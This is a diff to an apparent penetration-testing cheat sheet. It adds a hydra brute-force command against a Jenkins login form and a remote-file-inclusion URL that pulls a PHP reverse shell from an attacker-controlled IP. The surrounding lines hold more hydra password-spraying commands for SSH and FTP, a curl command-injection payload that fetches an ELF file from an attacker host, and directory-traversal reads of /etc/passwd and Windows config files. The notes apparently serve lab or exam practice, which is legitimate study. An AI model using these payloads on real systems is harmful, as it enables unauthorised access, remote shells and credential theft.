@@ -1722,6 +1722,9 @@ sudo hydra -l george -P /usr/share/wordlists/rockyou.txt -s 2222 ssh://<% tp.fro
 hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt -P /usr/share/metasploit-framework/data/wordlists/common_passwords.txt 192.88.141.3 -t 4 ssh
 sudo hydra -l george -P /usr/share/wordlists/rockyou.txt -s 2222 ssh://192.168.x.x
 
+# jenkins
+hydra -l admin -P /usr/share/wordlists/rockyou.txt 127.0.0.1 -s 8000 http-post-form "/j_acegi_security_check:j_username=^USER^&j_password=^PASS^&from=%2F&Submit=Sign+in&Login=Login:Invalid username or password" -V
+
 # ftp
 hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt -P /usr/share/metasploit-framework/data/wordlists/common_passwords.txt 192.88.141.3 ftp
 
@@ -2018,12 +2021,15 @@ curl -d '{"user":"clumsyadmin","url":"http://192.168.45.175:443/updatefile.elf;n
 - Check index.php file with php filter
 - Check DT vulnerability On windows: Check both absolute path && relative path
   - C:\Windows\System32\drivers\etc\hosts
+  - C:/Windows/System32/drivers/etc/hosts
   - C:\inetpub\logs\LogFiles\W3SVC1\
   - C:\inetpub\wwwroot\web.config
   - C:/Windows/boot.ini
   - C:/Windows/System32/drivers/etc/hosts
   - ../../../../../../../../../Windows/System32/drivers/etc/hosts
   - C:\xampp\apache\logs\access.log
+- Check if we can get revshell through remote page inclusion
+  - http://192.168.179.53:8080/site/index.php?page=http://192.168.45.202/php_ivan_sincek.php
 - On Linux: Check both absolute path && relative path
   - /etc/passwd
   - curl http://192.168.50.16/cgi-bin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
